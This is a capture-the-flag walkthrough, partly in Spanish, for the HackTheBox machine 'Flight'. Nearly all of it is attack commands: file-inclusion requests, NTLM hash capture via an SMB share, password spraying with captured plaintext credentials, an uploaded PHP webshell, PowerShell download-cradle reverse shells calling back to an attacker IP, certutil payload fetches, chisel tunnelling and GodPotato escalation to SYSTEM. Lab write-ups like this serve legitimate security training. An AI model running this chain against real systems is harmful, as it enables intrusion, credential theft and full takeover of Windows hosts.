---
title: "Flight"
---

```bash
ffuf -u http://flight.htb -H "Host: FUZZ.flight.htb" -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -mc all -ac
```

# LFI - Local File inclusion & RFI - Remote File Inclusion

```
GET http://school.flight.htb/index.php?view=C:/Windows/System32/drivers/etc/hosts
```

```
GET http://school.flight.htb/index.php?view=C:/xampp/apache/logs/access.log
```

NO ES LOG POISONING

```
http://school.flight.htb/index.php?view=C:/xampp/apache/logs/access.log&cmd=ping+10.10.14.4
```

Tratamos de cargar una php desde un servidor html pero no lo interpreta.

Podemos likear el hash cargando desde smbserver:

```
http://school.flight.htb/index.php?view=//10.10.14.4/share
```

```bash
impacket-smbserver share ./share -smb2support
```

```
svc_apache \ S@Ss!K@*t13
```

```bash
bloodhound-python  -u 'svc_apache' -p 'S@Ss!K@*t13' -d flight.htb -ns 10.10.11.187 -dc G0.flight.htb -c all --zip
```

```bash
smbmap -H 10.10.11.187 -u 'svc_apache' -p 'S@Ss!K@*t13'
```

```
recurse
prompt
mget *
```

```bash
smbclient //10.10.11.187/Users -U svc_apache%'S@Ss!K@*t13'
```

```bash
netexec smb 10.10.11.187 -u validUsers.txt  -p 'S@Ss!K@*t13'  -d flight.htb --continue-on-success --no-bruteforce
```

```
S.Moon \ S@Ss!K@*t13
```

```bash
smbmap -H 10.10.11.187 -u 'S.Moon' -p 'S@Ss!K@*t13'
```

```bash
exec smb 10.10.11.187 -u "S.Moon"  -p 'S@Ss!K@*t13'  -d flight.htb --shares
```

```bash
smbclient //flight.htb/shared -U S.Moon 'S@Ss!K@*t13'
```

```
prompt
mput *
```

```bash
sudo responder -I tun0
```

```
c.bum \ Tikkycoll_431012284
```

```bash
netexec smb 10.10.11.187 -u "C.Bum"  -p 'Tikkycoll_431012284'  -d flight.htb --shares
```

```bash
smbclient //flight.htb/Web -U "C.Bum" 'Tikkycoll_431012284'

mput shell.php
```

```
http://school.flight.htb/shell.php?cmd=whoami
```

```bash
python3 -m http.server 80
```

```bash
rlwrap nc -lvnp 4444
```

```
http://school.flight.htb/shell.php?cmd=powershell%20-c%20%22IEX%20(New-Object%20Net.WebClient).DownloadString(%27http://10.10.14.7/Invoke-PowerShellTcp.ps1%27)%22
```

```bash
certutil -urlcache -f http://10.10.14.7/runas.exe runas.exe 
```

```
rlwrap nc -lvnp 5555
```

```bash
./runas.exe c.bum Tikkycoll_431012284 powershell.exe -r 10.10.14.7:5555
```

```
chisel server --port 7777 --reverse
```

```bash
.\chisel client 10.10.14.7:7777 R:8000:127.0.0.1:8000
```

Dejamos `webshell.aspx` en `C:\inetpub\development`

```bash
powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.7/Invoke-PowerShellTcp.ps1')"
```

```bash
rlwrap nc -lvnp 6666
```
# **SeImpersonatePrivilege**

El usuario `iis apppool\defaultapppool` suele correr bajo `NT Authority System`.

```bash
.\GodPotato-NET4.exe -cmd "cmd /c whoami"
```

```bash
.\GodPotato-NET4.exe -cmd "cmd /c type C:\Users\Administrator\Desktop\root.txt"
```
